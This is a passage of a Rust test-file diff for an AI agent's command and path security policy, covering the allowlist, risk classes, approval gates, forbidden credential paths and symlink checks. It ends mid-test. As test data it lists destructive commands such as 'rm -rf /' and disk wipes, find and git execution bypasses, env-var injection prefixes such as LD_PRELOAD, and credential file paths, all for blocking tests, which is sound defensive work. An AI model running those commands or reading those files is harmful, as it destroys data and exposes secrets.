@@ -79,7 +79,81 @@ fn enforce_tool_operation_act_uses_rate_budget() {
     assert!(err.contains("Rate limit exceeded"));
 }
 
+#[test]
+fn action_budget_error_mentions_limit_and_settings() {
+    let p = SecurityPolicy {
+        max_actions_per_hour: 0,
+        ..default_policy()
+    };
+
+    let err = p
+        .enforce_tool_operation(ToolOperation::Act, "write_file")
+        .unwrap_err();
+
+    assert!(err.contains("Rate limit exceeded: action budget exhausted"));
+    assert!(err.contains("0 actions/hour"));
+    assert!(err.contains("Settings -> Advanced -> Agent autonomy"));
+}
+
 // -- is_command_allowed -------------------------------------------
+
+#[test]
+fn default_policy_allowed_commands_expanded() {
+    // Issue #2486: verify all newly added safe commands are present in the
+    // default allowlist so agents can use them without manual configuration.
+    let p = default_policy();
+
+    // Build tools
+    for cmd in ["make", "cmake", "pnpm", "yarn"] {
+        assert!(
+            p.is_command_allowed(cmd),
+            "default policy should allow build tool: {cmd}"
+        );
+    }
+
+    // Read-only inspection tools (low-risk)
+    for cmd in [
+        "sort file.txt",
+        "uniq file.txt",
+        "diff a.txt b.txt",
+        "which git",
+        "uname -a",
+        "basename /foo/bar.rs",
+        "dirname /foo/bar.rs",
+        "tr 'a' 'b'",
+        "cut -d: -f1 /dev/stdin",
+        "realpath .",
+        "readlink file",
+        "stat file.txt",
+        "file README.md",
+    ] {
+        assert!(
+            p.is_command_allowed(cmd),
+            "default policy should allow read-only tool: {cmd}"
+        );
+    }
+
+    // Filesystem mutation tools (medium-risk — allowed on allowlist,
+    // but require approval in Supervised mode)
+    for cmd in [
+        "mkdir src/new",
+        "touch Makefile",
+        "cp src/a.rs src/b.rs",
+        "mv old.txt new.txt",
+        "ln -s src/a.rs link.rs",
+    ] {
+        assert!(
+            p.is_command_allowed(cmd),
+            "default policy should allow medium-risk tool: {cmd}"
+        );
+        // Confirm they are actually medium-risk so the approval gate applies
+        assert_eq!(
+            p.command_risk_level(cmd),
+            CommandRiskLevel::Medium,
+            "{cmd} should be classified as medium-risk"
+        );
+    }
+}
 
 #[test]
 fn allowed_commands_basic() {
@@ -90,6 +164,53 @@ fn allowed_commands_basic() {
     assert!(p.is_command_allowed("cat file.txt"));
     assert!(p.is_command_allowed("grep -r pattern ."));
     assert!(p.is_command_allowed("date"));
+}
+
+#[test]
+fn allowed_commands_include_windows_read_equivalents() {
+    let p = default_policy();
+    for command in [
+        "dir",
+        "type README.md",
+        "where node",
+        "findstr pattern file.txt",
+        "more README.md",
+    ] {
+        assert!(
+            p.is_command_allowed(command),
+            "default policy should allow Windows read-only command: {command}"
+        );
+    }
+}
+
+#[test]
+fn config_default_policy_includes_windows_read_equivalents() {
+    let cfg = crate::openhuman::config::AutonomyConfig::default();
+    let p = SecurityPolicy::from_config(&cfg, std::path::Path::new("."));
+    for command in [
+        "dir",
+        "type README.md",
+        "where node",
+        "findstr pattern file.txt",
+        "more README.md",
+    ] {
+        assert!(
+            p.is_command_allowed(command),
+            "config-derived policy should allow Windows read-only command: {command}"
+        );
+    }
+    assert!(!p.is_command_allowed("date 2026-05-21"));
+}
+
+#[test]
+fn config_default_policy_allows_prompt_date_command() {
+    let cfg = crate::openhuman::config::AutonomyConfig::default();
+    let p = SecurityPolicy::from_config(&cfg, std::path::Path::new("."));
+
+    assert!(
+        p.is_command_allowed("date"),
+        "agent instructions use `shell date`, so the default runtime policy must allow it"
+    );
 }
 
 #[test]
@@ -112,10 +233,15 @@ fn readonly_blocks_all_commands() {
 }
 
 #[test]
-fn full_autonomy_still_uses_allowlist() {
+fn full_autonomy_bypasses_allowlist_but_validate_blocks_high_risk() {
     let p = full_policy();
+    // Full bypasses the allowlist: any base command passes is_command_allowed,
+    // including ones not in allowed_commands.
     assert!(p.is_command_allowed("ls"));
-    assert!(!p.is_command_allowed("rm -rf /"));
+    assert!(p.is_command_allowed("rm -rf /"));
+    // …but validate_command_execution still rejects high-risk commands while
+    // block_high_risk_commands is true (the default).
+    assert!(p.validate_command_execution("rm -rf /", false).is_err());
 }
 
 #[test]
@@ -189,19 +315,350 @@ fn command_risk_medium_for_mutating_commands() {
 }
 
 #[test]
-fn command_risk_high_for_dangerous_commands() {
-    let p = SecurityPolicy {
-        allowed_commands: vec!["rm".into()],
-        ..SecurityPolicy::default()
-    };
+fn command_risk_high_for_catastrophic_commands() {
+    let p = default_policy();
+    // Only catastrophic / irreversible / privilege / system-control are High.
+    assert_eq!(p.command_risk_level("rm -rf /"), CommandRiskLevel::High);
     assert_eq!(
-        p.command_risk_level("rm -rf /tmp/test"),
+        p.command_risk_level("dd if=/dev/zero of=/dev/sda"),
         CommandRiskLevel::High
+    );
+    assert_eq!(
+        p.command_risk_level("mkfs /dev/sda1"),
+        CommandRiskLevel::High
+    );
+    assert_eq!(
+        p.command_risk_level("shutdown -h now"),
+        CommandRiskLevel::High
+    );
+    assert_eq!(p.command_risk_level("sudo rm file"), CommandRiskLevel::High);
+    // An ordinary recursive delete of a relative path is NO LONGER high-risk
+    // (only the `rm -rf /…` absolute pattern is) — it's medium now.
+    assert_eq!(
+        p.command_risk_level("rm -rf build"),
+        CommandRiskLevel::Medium
+    );
+}
+
+// -- classify_command / gate_decision (fail-closed bucket model) --
+
+#[test]
+fn classify_reads_are_read() {
+    let p = default_policy();
+    for c in [
+        "ls -la",
+        "cat f",
+        "grep x f",
+        "git status",
+        "git log --oneline",
+        "pwd",
+        "wc -l f",
+        "head f",
+        "find . -name '*.rs'",
+        "cargo tree",
+        "npm ls",
+        "dir",
+        "type f.txt",
+        "Get-Content f",
+    ] {
+        assert_eq!(p.classify_command(c), CommandClass::Read, "{c}");
+    }
+}
+
+#[test]
+fn classify_unknown_is_write_fail_closed() {
+    let p = default_policy();
+    // The whole point: a command we don't recognize is NOT treated as read.
+    assert_eq!(p.classify_command("./deploy.sh"), CommandClass::Write);
+    assert_eq!(
+        p.classify_command("some-random-binary --go"),
+        CommandClass::Write
+    );
+    assert_eq!(p.classify_command("git"), CommandClass::Write); // bare git
+}
+
+#[test]
+fn classify_writes_are_write() {
+    let p = default_policy();
+    for c in [
+        "touch f",
+        "mkdir d",
+        "mv a b",
+        "rm -rf build",
+        "git commit -m x",
+        "git push",
+        "npm install",
+        "cargo build",
+        "node script.js",
+        "python3 x.py",
+        "bash -lc 'id'",
+        "Remove-Item x",
+    ] {
+        assert_eq!(p.classify_command(c), CommandClass::Write, "{c}");
+    }
+}
+
+#[test]
+fn classify_network_is_network() {
+    let p = default_policy();
+    for c in [
+        "curl http://x",
+        "wget http://x",
+        "ssh host",
+        "scp a b",
+        "nc -l 1",
+        "Invoke-WebRequest http://x",
+    ] {
+        assert_eq!(p.classify_command(c), CommandClass::Network, "{c}");
+    }
+}
+
+#[test]
+fn classify_destructive_is_destructive() {
+    let p = default_policy();
+    for c in [
+        "sudo rm f",
+        "dd if=/dev/zero of=/dev/sda",
+        "mkfs /dev/sda1",
+        "shutdown -h now",
+        "rm -rf /",
+        "format C:",
+        "diskpart",
+    ] {
+        assert_eq!(p.classify_command(c), CommandClass::Destructive, "{c}");
+    }
+}
+
+#[test]
+fn classify_highest_segment_wins() {
+    let p = default_policy();
+    assert_eq!(
+        p.classify_command("ls | curl http://x"),
+        CommandClass::Network
+    );
+    assert_eq!(
+        p.classify_command("cat f && sudo reboot"),
+        CommandClass::Destructive
+    );
+    assert_eq!(p.classify_command("ls && mkdir d"), CommandClass::Write);
+}
+
+#[test]
+fn classify_redirect_lifts_read_to_write() {
+    let p = default_policy();
+    // `cat` is read, but the redirect writes a file.
+    assert_eq!(p.classify_command("cat f"), CommandClass::Read);
+    assert_eq!(p.classify_command("cat f > out.txt"), CommandClass::Write);
+    assert_eq!(
+        p.classify_command("echo hi | tee out.txt"),
+        CommandClass::Write
     );
 }
 
 #[test]
-fn command_risk_high_for_command_executors() {
+fn gate_decision_readonly_blocks_acts() {
+    let p = readonly_policy();
+    assert_eq!(p.gate_decision(CommandClass::Read), GateDecision::Allow);
+    assert_eq!(p.gate_decision(CommandClass::Write), GateDecision::Block);
+    assert_eq!(p.gate_decision(CommandClass::Network), GateDecision::Block);
+    assert_eq!(
+        p.gate_decision(CommandClass::Destructive),
+        GateDecision::Block
+    );
+}
+
+#[test]
+fn gate_decision_supervised_prompts_every_act() {
+    let p = default_policy(); // Supervised
+    assert_eq!(p.gate_decision(CommandClass::Read), GateDecision::Allow);
+    assert_eq!(p.gate_decision(CommandClass::Write), GateDecision::Prompt);
+    assert_eq!(p.gate_decision(CommandClass::Network), GateDecision::Prompt);
+    assert_eq!(
+        p.gate_decision(CommandClass::Destructive),
+        GateDecision::Prompt
+    );
+}
+
+#[test]
+fn gate_decision_full_runs_write_but_prompts_network_and_destructive() {
+    let p = full_policy();
+    assert_eq!(p.gate_decision(CommandClass::Read), GateDecision::Allow);
+    assert_eq!(p.gate_decision(CommandClass::Write), GateDecision::Allow);
+    assert_eq!(p.gate_decision(CommandClass::Network), GateDecision::Prompt);
+    assert_eq!(
+        p.gate_decision(CommandClass::Destructive),
+        GateDecision::Prompt
+    );
+}
+
+// -- install chokepoint (Phase C) ---------------------------------
+
+#[test]
+fn classify_installs_are_install_bucket() {
+    let p = default_policy();
+    for c in [
+        "apt install jq",
+        "apt-get install -y curl",
+        "brew install ripgrep",
+        "pacman -S vim",
+        "pacman -Sy",
+        "pacman -Syu",
+        "apk add bash",
+        "dnf install nginx",
+        "pip install requests",
+        "pip3 install x",
+        "pipx install black",
+        "gem install rails",
+        "cargo install ripgrep",
+        "go install ./cmd/x",
+        "npm install -g typescript",
+        "pnpm add -g eslint",
+        "yarn global add prettier",
+    ] {
+        assert_eq!(p.classify_command(c), CommandClass::Install, "{c}");
+    }
+}
+
+#[test]
+fn classify_local_installs_are_write_not_install() {
+    let p = default_policy();
+    // Project-local installs are ordinary writes (run in Full), not the
+    // host-modifying Install bucket.
+    assert_eq!(p.classify_command("npm install"), CommandClass::Write);
+    assert_eq!(
+        p.classify_command("npm install lodash"),
+        CommandClass::Write
+    );
+    assert_eq!(p.classify_command("cargo add serde"), CommandClass::Write);
+}
+
+#[test]
+fn classify_pacman_readonly_queries_are_not_install() {
+    let p = default_policy();
+    // pacman's `-S` family includes read-only queries (search/info/list/groups/
+    // print). A blanket `starts_with("-s")` mis-bucketed these as always-ask
+    // Install; they must fall through to the fail-closed Write default instead.
+    for c in [
+        "pacman -Ss firefox", // search
+        "pacman -Si vim",     // info
+        "pacman -Sl core",    // list a repo
+        "pacman -Sg",         // list groups
+        "pacman -Sp vim",     // print download URLs
+    ] {
+        assert_eq!(p.classify_command(c), CommandClass::Write, "{c}");
+    }
+}
+
+#[test]
+fn gate_decision_install_always_asks_even_in_full() {
+    assert_eq!(
+        full_policy().gate_decision(CommandClass::Install),
+        GateDecision::Prompt
+    );
+    assert_eq!(
+        default_policy().gate_decision(CommandClass::Install),
+        GateDecision::Prompt
+    );
+    assert_eq!(
+        readonly_policy().gate_decision(CommandClass::Install),
+        GateDecision::Block
+    );
+}
+
+// -- cross-platform always-forbidden hardening (Phase E) ----------
+
+#[test]
+fn always_forbidden_blocks_credential_stores_case_insensitively() {
+    use std::path::Path;
+    for p in [
+        "/home/u/.ssh/id_rsa",
+        "/home/u/.SSH/id_rsa", // case-insensitive
+        "C:\\Users\\u\\.ssh\\id_rsa",
+        "/home/u/.gnupg/x",
+        "/home/u/.aws/credentials",
+        "/home/u/.azure/x",
+        "/home/u/.kube/config",
+        "/Users/u/Library/Keychains/login.keychain",
+        "C:\\Users\\u\\AppData\\Roaming\\Microsoft\\Protect\\x",
+        "C:\\Users\\u\\AppData\\Local\\Microsoft\\Credentials\\x",
+    ] {
+        assert!(SecurityPolicy::is_always_forbidden(Path::new(p)), "{p}");
+    }
+}
+
+#[test]
+fn always_forbidden_blocks_core_os_dirs_cross_platform() {
+    use std::path::Path;
+    for p in [
+        "/etc/passwd",
+        "/root/.bashrc",
+        "/boot/x",
+        "/proc/1",
+        "/sys/x",
+        "/System/Library/x",
+        "C:\\Windows\\System32\\config",
+        "C:\\WINDOWS\\x", // case-insensitive
+        "C:\\Program Files\\App\\x",
+        "C:\\ProgramData\\secret",
+    ] {
+        assert!(SecurityPolicy::is_always_forbidden(Path::new(p)), "{p}");
+    }
+}
+
+#[test]
+fn always_forbidden_leaves_gray_area_dirs_to_overridable_forbidden_paths() {
+    use std::path::Path;
+    // NOT unconditional — a trusted_root grant may reach these (e.g.
+    // /usr/local, /opt, ~/Library, project dirs).
+    for p in [
+        "/usr/local/bin/tool",
+        "/opt/app/x",
+        "/var/data/x",
+        "/Users/u/Library/Application Support/x",
+        "/home/u/projects/myrepo/src/main.rs",
+        "C:\\Users\\u\\projects\\app\\src",
+    ] {
+        assert!(!SecurityPolicy::is_always_forbidden(Path::new(p)), "{p}");
+    }
+}
+
+// -- LLM escalate-only category (Phase G) -------------------------
+
+#[test]
+fn parse_declared_class_maps_known_and_rejects_unknown() {
+    assert_eq!(
+        SecurityPolicy::parse_declared_class("destructive"),
+        Some(CommandClass::Destructive)
+    );
+    assert_eq!(
+        SecurityPolicy::parse_declared_class("  WRITE "),
+        Some(CommandClass::Write)
+    );
+    assert_eq!(
+        SecurityPolicy::parse_declared_class("network"),
+        Some(CommandClass::Network)
+    );
+    assert_eq!(
+        SecurityPolicy::parse_declared_class("install"),
+        Some(CommandClass::Install)
+    );
+    assert_eq!(SecurityPolicy::parse_declared_class("bogus"), None);
+    assert_eq!(SecurityPolicy::parse_declared_class(""), None);
+    // Escalate-only contract: max() raises but never lowers.
+    assert_eq!(
+        CommandClass::Write.max(CommandClass::Destructive),
+        CommandClass::Destructive
+    );
+    assert_eq!(
+        CommandClass::Destructive.max(CommandClass::Read),
+        CommandClass::Destructive
+    );
+}
+
+#[test]
+fn command_risk_medium_for_command_executors() {
+    // Interpreters / code executors are medium-risk now (not high): a coding
+    // agent must be able to run them — prompted in Supervised, allowed in Full.
     let p = default_policy();
     for command in [
         "xargs rm",
@@ -218,8 +675,8 @@ fn command_risk_high_for_command_executors() {
     ] {
         assert_eq!(
             p.command_risk_level(command),
-            CommandRiskLevel::High,
-            "{command} should be high risk"
+            CommandRiskLevel::Medium,
+            "{command} should be medium risk"
         );
     }
 }
@@ -303,10 +760,10 @@ fn validate_command_does_not_panic_on_multibyte_char_at_log_truncation_boundary(
         "command should be blocked, but did not panic"
     );
 
-    // And the high-risk-blocked path: allowlist passes (curl is allowed), then
-    // risk gate fires (curl is a high-risk command), exercising the truncating
+    // And the high-risk-blocked path: allowlist passes (dd is allowed), then
+    // risk gate fires (dd is a high-risk command), exercising the truncating
     // warn! site at the block_high_risk_commands branch.
-    let prefix = "curl https://example.com/";
+    let prefix = "dd if=/dev/zero of=/dev/";
     let filler = "a".repeat(80 - prefix.len() - 1);
     let high_risk_cmd = format!("{prefix}{filler}魔");
     assert!(
@@ -314,7 +771,7 @@ fn validate_command_does_not_panic_on_multibyte_char_at_log_truncation_boundary(
         "fixture must straddle byte 80 with a multi-byte char"
     );
     let high_risk_policy = SecurityPolicy {
-        allowed_commands: vec!["curl".into()],
+        allowed_commands: vec!["dd".into()],
         ..SecurityPolicy::default()
     };
     let blocked = high_risk_policy.validate_command_execution(&high_risk_cmd, true);
@@ -336,26 +793,26 @@ fn validate_command_handles_short_multibyte_command() {
 #[test]
 fn relative_paths_allowed() {
     let p = default_policy();
-    assert!(p.is_path_allowed("file.txt"));
-    assert!(p.is_path_allowed("src/main.rs"));
-    assert!(p.is_path_allowed("deep/nested/dir/file.txt"));
+    assert!(p.is_path_string_allowed("file.txt"));
+    assert!(p.is_path_string_allowed("src/main.rs"));
+    assert!(p.is_path_string_allowed("deep/nested/dir/file.txt"));
 }
 
 #[test]
 fn path_traversal_blocked() {
     let p = default_policy();
-    assert!(!p.is_path_allowed("../etc/passwd"));
-    assert!(!p.is_path_allowed("../../root/.ssh/id_rsa"));
-    assert!(!p.is_path_allowed("foo/../../../etc/shadow"));
-    assert!(!p.is_path_allowed(".."));
+    assert!(!p.is_path_string_allowed("../etc/passwd"));
+    assert!(!p.is_path_string_allowed("../../root/.ssh/id_rsa"));
+    assert!(!p.is_path_string_allowed("foo/../../../etc/shadow"));
+    assert!(!p.is_path_string_allowed(".."));
 }
 
 #[test]
 fn absolute_paths_blocked_when_workspace_only() {
     let p = default_policy();
-    assert!(!p.is_path_allowed("/etc/passwd"));
-    assert!(!p.is_path_allowed("/root/.ssh/id_rsa"));
-    assert!(!p.is_path_allowed("/tmp/file.txt"));
+    assert!(!p.is_path_string_allowed("/etc/passwd"));
+    assert!(!p.is_path_string_allowed("/root/.ssh/id_rsa"));
+    assert!(!p.is_path_string_allowed("/tmp/file.txt"));
 }
 
 #[test]
@@ -365,7 +822,7 @@ fn absolute_paths_allowed_when_not_workspace_only() {
         forbidden_paths: vec![],
         ..SecurityPolicy::default()
     };
-    assert!(p.is_path_allowed("/tmp/file.txt"));
+    assert!(p.is_path_string_allowed("/tmp/file.txt"));
 }
 
 #[test]
@@ -374,23 +831,155 @@ fn forbidden_paths_blocked() {
         workspace_only: false,
         ..SecurityPolicy::default()
     };
-    assert!(!p.is_path_allowed("/etc/passwd"));
-    assert!(!p.is_path_allowed("/root/.bashrc"));
-    assert!(!p.is_path_allowed("~/.ssh/id_rsa"));
-    assert!(!p.is_path_allowed("~/.gnupg/pubring.kbx"));
+    assert!(!p.is_path_string_allowed("/etc/passwd"));
+    assert!(!p.is_path_string_allowed("/root/.bashrc"));
+    assert!(!p.is_path_string_allowed("~/.ssh/id_rsa"));
+    assert!(!p.is_path_string_allowed("~/.gnupg/pubring.kbx"));
 }
 
 #[test]
 fn empty_path_allowed() {
     let p = default_policy();
-    assert!(p.is_path_allowed(""));
+    assert!(p.is_path_string_allowed(""));
 }
 
 #[test]
 fn dotfile_in_workspace_allowed() {
-    let p = default_policy();
-    assert!(p.is_path_allowed(".gitignore"));
-    assert!(p.is_path_allowed(".env"));
+    let workspace = tempfile::tempdir().expect("workspace tempdir");
+    std::fs::write(workspace.path().join(".gitignore"), "target/\n").expect("write .gitignore");
+    std::fs::write(workspace.path().join(".env"), "LOCAL_ONLY=1\n").expect("write .env");
+    let p = SecurityPolicy {
+        workspace_dir: workspace.path().to_path_buf(),
+        workspace_only: true,
+        forbidden_paths: vec![],
+        ..SecurityPolicy::default()
+    };
+    assert!(p.is_path_string_allowed(".gitignore"));
+    assert!(p.is_path_string_allowed(".env"));
+}
+
+// -- is_path_allowed — symlink safety (#1927) ---------------------
+
+#[cfg(unix)]
+#[test]
+fn symlink_inside_workspace_escaping_outside_is_blocked() {
+    use std::os::unix::fs::symlink;
+
+    let workspace = tempfile::tempdir().expect("workspace tempdir");
+    let outside = tempfile::tempdir().expect("outside tempdir");
+    let target = outside.path().join("secret.txt");
+    std::fs::write(&target, "secret").expect("write secret");
+
+    let link = workspace.path().join("evil");
+    symlink(&target, &link).expect("create symlink");
+
+    let p = SecurityPolicy {
+        workspace_dir: workspace.path().to_path_buf(),
+        workspace_only: true,
+        forbidden_paths: vec![],
+        ..SecurityPolicy::default()
+    };
+
+    // String-level checks pass: "evil" has no "..", isn't absolute, and is
+    // not in forbidden_paths. The canonicalize step must catch the symlink
+    // pointing outside the workspace root.
+    assert!(
+        !p.is_path_string_allowed("evil"),
+        "symlink that escapes the workspace must be blocked"
+    );
+}
+
+#[cfg(unix)]
+#[test]
+fn symlink_to_forbidden_tree_is_blocked() {
+    use std::os::unix::fs::symlink;
+
+    let workspace = tempfile::tempdir().expect("workspace tempdir");
+    let forbidden = tempfile::tempdir().expect("forbidden tempdir");
+    let target = forbidden.path().join("secret");
+    std::fs::write(&target, "x").expect("write secret");
+
+    let link = workspace.path().join("link-to-forbidden");
+    symlink(&target, &link).expect("create symlink");
+
+    let p = SecurityPolicy {
+        workspace_dir: workspace.path().to_path_buf(),
+        // Disable workspace_only so the assertion isolates the forbidden_paths
+        // path (the symlink escapes the workspace, which would also trip
+        // workspace_only — but here we want to prove the forbidden_paths
+        // check itself canonicalizes).
+        workspace_only: false,
+        forbidden_paths: vec![forbidden.path().to_string_lossy().to_string()],
+        ..SecurityPolicy::default()
+    };
+
+    // The string "link-to-forbidden" does not start with the forbidden
+    // tempdir path, so the string-level check passes. Canonical resolution
+    // must catch that it resolves into the forbidden tree.
+    assert!(
+        !p.is_path_string_allowed("link-to-forbidden"),
+        "symlink that resolves into a forbidden tree must be blocked"
+    );
+}
+
+#[test]
+fn write_to_not_yet_existing_path_in_workspace_still_allowed() {
+    // After adding the symlink-safe canonicalize step, writing to a
+    // not-yet-existing path inside the workspace must still pass — the
+    // parent-dir fallback canonicalizes the parent and confirms it is
+    // inside the workspace root.
+    let workspace = tempfile::tempdir().expect("workspace tempdir");
+    let p = SecurityPolicy {
+        workspace_dir: workspace.path().to_path_buf(),
+        workspace_only: true,
+        forbidden_paths: vec![],
+        ..SecurityPolicy::default()
+    };
+
+    assert!(p.is_path_string_allowed("new-file.txt"));
+    // Whole parent chain missing too — helper returns None, and we fall
+    // back to the string-level checks (which would pass for a
+    // workspace-relative non-traversal path).
+    assert!(p.is_path_string_allowed("not-yet-existing/subdir/file.txt"));
+}
+
+// -- auto_approve defaults ----------------------------------------
+
+#[test]
+fn config_default_auto_approve_includes_expanded_tools() {
+    // Issue #2486: verify read-only tools are auto-approved by default,
+    // and write tools are NOT (Supervised mode must prompt for edits).
+    let cfg = crate::openhuman::config::AutonomyConfig::default();
+
+    // Pre-existing auto-approved tools must still be present
+    for tool in [
+        "file_read",
+        "memory_search",
+        "memory_list",
+        "get_time",
+        "list_dir",
+    ] {
+        assert!(
+            cfg.auto_approve.iter().any(|t| t == tool),
+            "default auto_approve must still include pre-existing tool: {tool}"
+        );
+    }
+
+    // Newly added read-only workspace-scoped tools
+    for tool in ["glob", "grep"] {
+        assert!(
+            cfg.auto_approve.iter().any(|t| t == tool),
+            "default auto_approve must include newly added tool: {tool}"
+        );
+    }
+
+    // Write tools must NOT be auto-approved (v4→v5 migration strips these)
+    for tool in ["file_write", "edit_file"] {
+        assert!(
+            !cfg.auto_approve.iter().any(|t| t == tool),
+            "write tool {tool} must NOT be auto-approved by default"
+        );
+    }
 }
 
 // -- from_config --------------------------------------------------
@@ -406,6 +995,7 @@ fn from_config_maps_all_fields() {
         max_cost_per_day_cents: 1000,
         require_approval_for_medium_risk: false,
         block_high_risk_commands: false,
+        auto_approve: vec!["shell".into(), "file_write".into()],
         ..crate::openhuman::config::AutonomyConfig::default()
     };
     let workspace = PathBuf::from("/tmp/test-workspace");
@@ -420,6 +1010,9 @@ fn from_config_maps_all_fields() {
     assert!(!policy.require_approval_for_medium_risk);
     assert!(!policy.block_high_risk_commands);
     assert_eq!(policy.workspace_dir, PathBuf::from("/tmp/test-workspace"));
+    // The "Always allow" allowlist is carried onto the policy so the gate can
+    // skip prompting for these tools.
+    assert_eq!(policy.auto_approve, vec!["shell", "file_write"]);
 }
 
 // -- Default policy -----------------------------------------------
@@ -619,6 +1212,10 @@ fn command_argument_injection_blocked() {
     // find -exec is a common bypass
     assert!(!p.is_command_allowed("find . -exec rm -rf {} +"));
     assert!(!p.is_command_allowed("find / -ok cat {} \\;"));
+    // -execdir / -okdir have identical command-execution semantics — same cwd
+    // bypass class, different option spelling.
+    assert!(!p.is_command_allowed("find /tmp -maxdepth 1 -name poc_proof.txt -execdir whoami \\;"));
+    assert!(!p.is_command_allowed("find /etc -name passwd -okdir head -3 {} \\;"));
     // git config/alias can execute commands
     assert!(!p.is_command_allowed("git config core.editor \"rm -rf /\""));
     assert!(!p.is_command_allowed("git alias.st status"));
@@ -627,6 +1224,61 @@ fn command_argument_injection_blocked() {
     assert!(p.is_command_allowed("find . -name '*.txt'"));
     assert!(p.is_command_allowed("git status"));
     assert!(p.is_command_allowed("git add ."));
+}
+
+#[test]
+fn dangerous_env_var_prefix_blocked() {
+    let p = default_policy();
+    // GIT_PAGER / PAGER / GIT_SSH_COMMAND / GIT_EXTERNAL_DIFF / EDITOR all
+    // cause git or other allowed binaries to spawn the assigned value as a
+    // subprocess. The bare command (`git log`, `git status`, `git diff`)
+    // is allowlisted, but the env prefix shifts execution to an arbitrary
+    // command.
+    assert!(!p.is_command_allowed("GIT_PAGER=/tmp/payload.sh git log"));
+    assert!(!p.is_command_allowed("PAGER=calc.exe git log"));
+    assert!(!p.is_command_allowed("GIT_SSH_COMMAND=/tmp/x git fetch"));
+    assert!(!p.is_command_allowed("GIT_EXTERNAL_DIFF=/tmp/x git diff"));
+    assert!(!p.is_command_allowed("EDITOR=/tmp/x git commit"));
+    assert!(!p.is_command_allowed("VISUAL=/tmp/x git commit"));
+    assert!(!p.is_command_allowed("LESS=/tmp/x cat /etc/passwd"));
+    assert!(!p.is_command_allowed("LESSOPEN=/tmp/x cat /etc/passwd"));
+    assert!(!p.is_command_allowed("MANPAGER=/tmp/x man bash"));
+    assert!(!p.is_command_allowed("BAT_PAGER=/tmp/x bat file"));
+    assert!(!p.is_command_allowed("BROWSER=/tmp/x git status"));
+    // Loader-override variables let an attacker inject a library into the
+    // next process.
+    assert!(!p.is_command_allowed("LD_PRELOAD=/tmp/x.so git status"));
+    assert!(!p.is_command_allowed("LD_LIBRARY_PATH=/tmp git status"));
+    assert!(!p.is_command_allowed("LD_AUDIT=/tmp/x.so git status"));
+    assert!(!p.is_command_allowed("DYLD_INSERT_LIBRARIES=/tmp/x.dylib git status"));
+    assert!(!p.is_command_allowed("DYLD_LIBRARY_PATH=/tmp git status"));
+    assert!(!p.is_command_allowed("DYLD_FORCE_FLAT_NAMESPACE=1 git status"));
+    // Shell-evaluation variables.
+    assert!(!p.is_command_allowed("BASH_ENV=/tmp/x git status"));
+    assert!(!p.is_command_allowed("ENV=/tmp/x git status"));
+    assert!(!p.is_command_allowed("PROMPT_COMMAND=/tmp/x git status"));
+    assert!(!p.is_command_allowed("IFS=$'\\n' git status"));
+    // Python startup hook + path override.
+    assert!(!p.is_command_allowed("PYTHONSTARTUP=/tmp/x python3 -V"));
+    assert!(!p.is_command_allowed("PYTHONPATH=/tmp python3 -V"));
+    // PATH / SHELL overrides redirect resolution of the next binary.
+    assert!(!p.is_command_allowed("PATH=/tmp git status"));
+    assert!(!p.is_command_allowed("SHELL=/tmp/x git status"));
+    // Lower-case spellings still match (env names are case-insensitive
+    // by convention here — most shells uppercase them, but the matcher
+    // should not be fooled by case folding).
+    assert!(!p.is_command_allowed("git_pager=/tmp/x git log"));
+    // Case-insensitive: should also catch mixed-case names.
+    assert!(!p.is_command_allowed("Ld_PrElOaD=/tmp/x.so git status"));
+
+    // Benign env prefixes still pass: TZ, LANG, LC_ALL, custom names that
+    // don't trigger downstream subprocess execution.
+    assert!(p.is_command_allowed("TZ=UTC git log"));
+    assert!(p.is_command_allowed("LANG=en_US.UTF-8 git log"));
+    assert!(p.is_command_allowed("LC_ALL=C git status"));
+    assert!(p.is_command_allowed("FOO=bar git status"));
+    // No env prefix at all — unchanged.
+    assert!(p.is_command_allowed("git status"));
 }
 
 #[test]
@@ -711,29 +1363,29 @@ fn command_env_var_prefix_with_allowed_cmd() {
 fn path_traversal_encoded_dots() {
     let p = default_policy();
     // Literal ".." in path — always blocked
-    assert!(!p.is_path_allowed("foo/..%2f..%2fetc/passwd"));
+    assert!(!p.is_path_string_allowed("foo/..%2f..%2fetc/passwd"));
 }
 
 #[test]
 fn path_traversal_double_dot_in_filename() {
     let p = default_policy();
     // ".." in a filename (not a path component) is allowed
-    assert!(p.is_path_allowed("my..file.txt"));
+    assert!(p.is_path_string_allowed("my..file.txt"));
     // But actual traversal components are still blocked
-    assert!(!p.is_path_allowed("../etc/passwd"));
-    assert!(!p.is_path_allowed("foo/../etc/passwd"));
+    assert!(!p.is_path_string_allowed("../etc/passwd"));
+    assert!(!p.is_path_string_allowed("foo/../etc/passwd"));
 }
 
 #[test]
 fn path_with_null_byte_blocked() {
     let p = default_policy();
-    assert!(!p.is_path_allowed("file\0.txt"));
+    assert!(!p.is_path_string_allowed("file\0.txt"));
 }
 
 #[test]
 fn path_symlink_style_absolute() {
     let p = default_policy();
-    assert!(!p.is_path_allowed("/proc/self/root/etc/passwd"));
+    assert!(!p.is_path_string_allowed("/proc/self/root/etc/passwd"));
 }
 
 #[test]
@@ -742,8 +1394,8 @@ fn path_home_tilde_ssh() {
         workspace_only: false,
         ..SecurityPolicy::default()
     };
-    assert!(!p.is_path_allowed("~/.ssh/id_rsa"));
-    assert!(!p.is_path_allowed("~/.gnupg/secring.gpg"));
+    assert!(!p.is_path_string_allowed("~/.ssh/id_rsa"));
+    assert!(!p.is_path_string_allowed("~/.gnupg/secring.gpg"));
 }
 
 #[test]
@@ -752,7 +1404,7 @@ fn path_var_run_blocked() {
         workspace_only: false,
         ..SecurityPolicy::default()
     };
-    assert!(!p.is_path_allowed("/var/run/docker.sock"));
+    assert!(!p.is_path_string_allowed("/var/run/docker.sock"));
 }
 
 // -- Edge cases: rate limiter boundary ----------------------------
@@ -820,8 +1472,8 @@ fn full_autonomy_still_respects_forbidden_paths() {
         workspace_only: false,
         ..SecurityPolicy::default()
     };
-    assert!(!p.is_path_allowed("/etc/shadow"));
-    assert!(!p.is_path_allowed("/root/.bashrc"));
+    assert!(!p.is_path_string_allowed("/etc/shadow"));
+    assert!(!p.is_path_string_allowed("/root/.bashrc"));
 }
 
 // -- Edge cases: from_config preserves tracker --------------------
@@ -857,11 +1509,11 @@ fn from_config_creates_fresh_tracker() {
 fn checklist_root_path_blocked() {
     let p = default_policy();
     if cfg!(windows) {
-        assert!(!p.is_path_allowed("C:\\"));
-        assert!(!p.is_path_allowed("C:\\anything"));
+        assert!(!p.is_path_string_allowed("C:\\"));
+        assert!(!p.is_path_string_allowed("C:\\anything"));
     } else {
-        assert!(!p.is_path_allowed("/"));
